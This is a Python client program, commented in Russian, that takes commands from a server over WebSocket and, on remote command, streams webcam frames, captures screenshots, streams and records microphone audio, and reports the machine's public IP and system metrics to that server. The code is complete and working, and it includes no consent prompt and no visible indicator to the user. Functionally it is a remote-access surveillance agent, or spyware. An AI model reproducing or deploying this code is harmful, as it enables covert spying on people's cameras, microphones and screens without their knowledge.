import cv2
import requests
import time
import logging
import threading
from mss import mss  # Для захвата скриншотов
from mss.tools import to_png  # Для конвертации в PNG
import websocket  # pip install websocket-client
import psutil       # Для получения системных метрик
import platform     # Для информации о процессоре и ОС
import json         # Для сериализации данных в JSON

import pyaudio
import wave
import io

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler("client.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Настройки
BASE_URL = "http://127.0.0.1:4000"
SERVER_URL = "http://127.0.0.1:4000/upload"  # Адрес сервера для загрузки данных
FRAME_RATE = 10           # Количество кадров в секунду (для видео)
SCREENSHOT_INTERVAL = 5   # Интервал между скриншотами (в секундах)
WS_URL = "ws://127.0.0.1:4000/ws"  # URL WebSocket-сервера
RECORD_DURATION = 5 # Длительность записи аудио (в секундах)

# Глобальный флаг трансляции – по умолчанию выключен
streaming_active = False
mic_streaming_active = False

# Глобальные переменные для защиты WebSocket-соединения
ws_lock = threading.Lock()
ws_active = False

def send_ip_via_ws(ws):
    """
    Получает публичный IP через ipify и отправляет его на сервер через WebSocket.
    Формат сообщения: "ip:<адрес>"
    """
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=10)
        ip = response.json().get("ip")
        logger.info(f"Получен публичный IP: {ip}")
        ws.send("ip:" + ip)
    except Exception as e:
        logger.error(f"Ошибка получения или отправки публичного IP: {e}")

def collect_and_send_metrics(ws):
    """
    Собирает метрики системы (дисковое пространство, оперативную память, процессор, ОС)
    и отправляет их на сервер в формате JSON.
    """
    metrics = {}
    try:
        # Получаем данные по дисковому пространству для системного диска (обычно C:\)
        disk_usage = psutil.disk_usage("C:\\")
        metrics["disk_total"] = disk_usage.total
        metrics["disk_free"] = disk_usage.free

        # Получаем данные по оперативной памяти
        mem = psutil.virtual_memory()
        metrics["memory_total"] = mem.total
        metrics["memory_available"] = mem.available

        # Тип процессора
        metrics["processor"] = platform.processor()

        # Операционная система
        metrics["os"] = f"{platform.system()} {platform.release()}"
    except Exception as e:
        logger.error(f"Ошибка сбора метрик: {e}")
        metrics["error"] = str(e)

    try:
        # Отправляем метрики на сервер
        ws.send(json.dumps({"command": "metrics", "data": metrics}))
        logger.info("Метрики отправлены на сервер")
    except Exception as e:
        logger.error(f"Ошибка отправки метрик: {e}")

def capture_and_send_video():
    """
    Захват видео и скриншотов.
    Камера открывается только когда streaming_active True.
    При выключении трансляции камера закрывается, чтобы не нагружать систему.
    """
    camera = None

    while True:
        if streaming_active:
            if camera is None:
                camera = cv2.VideoCapture(0)
                if not camera.isOpened():
                    logger.error("Камера не найдена. Попытка повторного открытия через 5 секунд.")
                    camera = None
                    time.sleep(5)
                    continue
                logger.info("Камера успешно запущена.")

            ret, frame = camera.read()
            if not ret:
                logger.error("Ошибка захвата кадра")
                time.sleep(1)
                continue

            _, buffer = cv2.imencode(".jpg", frame)
            frame_data = buffer.tobytes()

            try:
                logger.info("Отправка кадра на сервер...")
                response = requests.post(
                    f"{SERVER_URL}/",
                    data=frame_data,
                    headers={"Content-Type": "image/jpeg"}
                )
                if response.status_code == 200:
                    logger.info("Кадр успешно отправлен.")
                else:
                    logger.error(f"Ошибка отправки кадра: {response.status_code} - {response.text}")
            except Exception as e:
                logger.error(f"Ошибка отправки видео: {e}")

            time.sleep(1 / FRAME_RATE)
        else:
            if camera is not None:
                camera.release()
                camera = None
                logger.info("Камера освобождена (трансляция остановлена).")
            time.sleep(1)

def takeScreenshot():
    sct = mss()

    try:
        screenshot = sct.grab(sct.monitors[1])
        screenshot_data = to_png(screenshot.rgb, screenshot.size)
        logger.info("Отправка скриншота на сервер...")
        response = requests.post(
            f"{SERVER_URL}/screenshot",
            data=screenshot_data,
            headers={"Content-Type": "image/png"}
        )
        if response.status_code == 200:
            logger.info("Скриншот успешно отправлен.")
        else:
            logger.error(f"Ошибка отправки скриншота: {response.status_code} - {response.text}")
    except Exception as e:
        logger.error(f"Ошибка захвата или отправки скриншота: {e}")

def capture_and_send_audio():
    """
    Захват аудио с микрофона и отправка данных на сервер.
    Микрофон открывается только когда mic_streaming_active True.
    При остановке трансляции аудио поток закрывается.
    """
    global mic_streaming_active
    stream = None
    p = pyaudio.PyAudio()

    while True:
        if mic_streaming_active:
            if stream is None:
                try:
                    stream = p.open(format=pyaudio.paInt16,
                                    channels=1,
                                    rate=44100,
                                    input=True,
                                    frames_per_buffer=1024)
                    logger.info("Микрофон успешно запущен.")
                except Exception as e:
                    logger.error("Ошибка открытия микрофона: " + str(e))
                    stream = None
                    time.sleep(5)
                    continue

            try:
                audio_data = stream.read(1024, exception_on_overflow=False)
                logger.info("Отправка аудио кадра на сервер...")
                response = requests.post(
                    f"{SERVER_URL}/audio",
                    data=audio_data,
                    headers={"Content-Type": "application/octet-stream"}
                )
                if response.status_code == 200:
                    logger.info("Аудио кадр успешно отправлен.")
                else:
                    logger.error(f"Ошибка отправки аудио кадра: {response.status_code} - {response.text}")
            except Exception as e:
                logger.error(f"Ошибка захвата или отправки аудио: {e}")

            time.sleep(0.1)  # Короткая задержка между отправками
        else:
            if stream is not None:
                stream.stop_stream()
                stream.close()
                stream = None
                logger.info("Микрофон освобождён (трансляция остановлена).")
            time.sleep(1)

def record_audio_snippet():
    """
    Записывает аудио с микрофона в течение RECORD_DURATION секунд,
    конвертирует запись в формат WAV и отправляет на сервер.
    """
    p = pyaudio.PyAudio()
    stream = None
    frames = []
    try:
        stream = p.open(format=pyaudio.paInt16,
                        channels=1,
                        rate=44100,
                        input=True,
                        frames_per_buffer=1024)
        logger.info(f"Начата запись аудио на {RECORD_DURATION} секунд...")
        for i in range(0, int(44100 / 1024 * RECORD_DURATION)):
            data = stream.read(1024, exception_on_overflow=False)
            frames.append(data)
        logger.info("Запись аудио завершена.")
    except Exception as e:
        logger.error("Ошибка записи аудио: " + str(e))
    finally:
        if stream is not None:
            stream.stop_stream()
            stream.close()
        p.terminate()

    # Сохранение аудио в WAV формат в память
    try:
        buffer = io.BytesIO()
        wf = wave.open(buffer, 'wb')
        wf.setnchannels(1)
        wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
        wf.setframerate(44100)
        wf.writeframes(b''.join(frames))
        wf.close()
        audio_bytes = buffer.getvalue()

        logger.info("Отправка записанного аудио на сервер...")
        response = requests.post(
            f"{SERVER_URL}/recorded_audio",
            data=audio_bytes,
            headers={"Content-Type": "audio/wav"}
        )
        if response.status_code == 200:
            logger.info("Записанное аудио успешно отправлено.")
        else:
            logger.error(f"Ошибка отправки записанного аудио: {response.status_code} - {response.text}")
    except Exception as e:
        logger.error("Ошибка обработки или отправки записанного аудио: " + str(e))

def control_ws():
    global ws_active
    def on_message(ws, message):
        global streaming_active, mic_streaming_active
        logger.info(f"Получена команда: {message}")
        cmd = message.lower()
        if cmd == "stop":
            streaming_active = False
            logger.info("Видео трансляция остановлена командой сервера.")
        elif cmd == "start":
            streaming_active = True
            logger.info("Видео трансляция запущена командой сервера.")
        elif cmd == "send_ip":
            logger.info("Отправка данных по IP по команде сервера.")
            send_ip_via_ws(ws)
        elif cmd == "screenshot":
            takeScreenshot()
        elif cmd == "metrics":
            collect_and_send_metrics(ws)
        elif cmd == "mic_start":
            mic_streaming_active = True
            logger.info("Трансляция микрофона запущена командой сервера.")
        elif cmd == "mic_stop":
            mic_streaming_active = False
            logger.info("Трансляция микрофона остановлена командой сервера.")
        elif cmd == "record_audio":
            logger.info("Запись аудио по команде сервера.")
            threading.Thread(target=record_audio_snippet, daemon=True).start()

    def on_error(ws, error):
        logger.error(f"WebSocket ошибка: {error}")

    def on_close(ws, close_status_code, close_msg):
        global ws_active
        with ws_lock:
            ws_active = False
        logger.info("WebSocket соединение закрыто")

    def on_open(ws):
        global ws_active
        with ws_lock:
            ws_active = True
        logger.info("WebSocket соединение установлено")
        ws.send("Client connected")
        send_ip_via_ws(ws)

    while True:
        with ws_lock:
            active = ws_active
        if not active:
            try:
                ws = websocket.WebSocketApp(WS_URL,
                                            on_open=on_open,
                                            on_message=on_message,
                                            on_error=on_error,
                                            on_close=on_close)
                ws.run_forever()
            except Exception as e:
                logger.error(f"Ошибка WebSocket подключения: {e}")
        time.sleep(5)  # Попытка переподключения через 5 секунд, если соединение не активно

if __name__ == "__main__":
    logger.info("Клиент запустился")
    # Проверка доступности сервера
    try:
        response = requests.get(f"{BASE_URL + '/api/time'}", timeout=5)
        if response.status_code == 200:
            logger.info(f"Сервер доступен. Серверное время: {response.text}")
        else:
            logger.error(f"Ошибка подключения к серверу: {response.status_code}")
            exit(1)
    except Exception as e:
        logger.error(f"Ошибка подключения к серверу: {e}")
        exit(1)

    # Запуск потока WebSocket для управления трансляцией (только один раз!)
    ws_thread = threading.Thread(target=control_ws, daemon=True)
    ws_thread.start()

    # Запуск потока для трансляции видео
    video_thread = threading.Thread(target=capture_and_send_video, daemon=True)
    video_thread.start()

    # Запуск потока для трансляции аудио с микрофона
    mic_thread = threading.Thread(target=capture_and_send_audio, daemon=True)
    mic_thread.start()

    ws_thread.join()
    video_thread.join()
    mic_thread.join()

    # # Запуск основного цикла захвата и отправки видео/скриншотов
    # capture_and_send_video()
